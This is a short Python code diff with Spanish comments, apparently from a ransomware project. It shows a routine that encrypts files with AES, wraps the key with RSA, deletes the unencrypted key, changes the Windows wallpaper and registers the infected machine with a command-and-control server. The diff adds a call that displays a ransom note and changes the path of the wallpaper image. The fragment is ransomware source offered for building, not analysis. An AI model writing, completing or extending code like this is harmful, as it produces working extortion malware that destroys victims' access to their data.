@@ -7,6 +7,7 @@ from Crypto.Util.Padding import pad
 from find_files import find_files
 import gen_keys
 import agent
+import ransom_note
 
 def load_aes_key():
     ruta_clave = os.path.abspath("aes_key.bin")
@@ -46,9 +47,10 @@ def encrypt_files():
     print("Archivos cifrados correctamente.")
     encrypt_aes_key(aes_key)  # Se cifra la clave AES con RSA
     os.remove("aes_key.bin")  # Eliminar clave simétrica sin cifrar
-    change_background()
+    change_background() # Cambiar fondo de pantalla
     agent.register_agent()  # Registrar agente en comando y control
+    ransom_note.show_ransom_note()
 
 def change_background():
-    image_path = os.path.abspath("image/background.jpg")
+    image_path = os.path.abspath("background_image/background.png")
     ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
